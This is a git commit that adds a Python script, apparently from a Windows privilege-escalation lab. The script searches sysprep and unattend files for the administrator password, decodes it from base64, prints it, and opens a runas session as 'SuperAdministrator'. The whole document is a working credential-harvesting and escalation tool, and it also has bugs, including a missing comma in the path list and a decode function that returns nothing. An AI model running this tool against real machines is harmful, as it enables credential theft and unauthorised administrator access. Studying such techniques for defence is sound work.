b522a85b40e30154137573828145dc338595dd44
Emma Lateyron <emma.lateyron@orange.fr>
2025-10-30 22:45:31 +0100

    extract_password

---
+++ privilege_escalation_security_win/windows_privsec/extract_password.py
@@ -0,0 +1,69 @@
+import os
+import re
+import base64
+import subprocess
+
+# Common file paths to find the password
+file_paths = [
+    "C:\\Windows\\System32\\sysprep\\sysprep.inf"
+    "C:\\Windows\\Panther\\Autounattend.xml",
+    "C:\\Windows\\Panther\\Unattend.xml",
+]
+
+# Pattern that match the password
+pattern = re.compile(r"<AdministratorPassword>\s*<Value>(.*?)</Value>",
+                     re.IGNORECASE)
+
+
+def extract_password(file_path):
+    """Extracts admin password."""
+    try:
+        with open(file_path, "r", encoding="utf-8") as file:
+            match = pattern.search(file.read())
+            if match:
+                return match.group(1)
+    except Exception:
+        pass
+
+    return None
+
+
+def decode_password(encoded_password):
+    """Decode if the password is base64 encoded"""
+    try:
+        decoded_password = base64.b64decode(encoded_password).decode("utf-8")
+        print(f"[+] Decoded Admin Password: {decoded_password}")
+    except:
+        decoded_password = encoded_password
+        print(f"[+] Plaintext Admin Password: {decoded_password}")
+
+
+def start_admin_session(password):
+    """Start an admin session using 'runas'"""
+    dir_name = f'"cmd.exe /K dir C:\\Users\\SuperAdministrator\\Desktop"'
+    command = f'runas /user:SuperAdministrator {dir_name}'
+    try:
+        subprocess.run(command, shell=True)
+        print("[+] Admin session initiated.")
+    except Exception as e:
+        print(f"[-] Failed to start admin session: {e}")
+
+
+def main():
+
+    admin_password = None
+    for path in file_paths:
+        if os.path.exists(path):
+            admin_password = extract_password(path)
+            if admin_password:
+                print(f"[+] Password found in: {path}")
+                decoded_password = decode_password(admin_password)
+                start_admin_session(decoded_password)
+
+    if not admin_password:
+        print("[-] No administrator password found.")
+        exit(1)
+
+
+if __name__ == "__main__":
+    main()
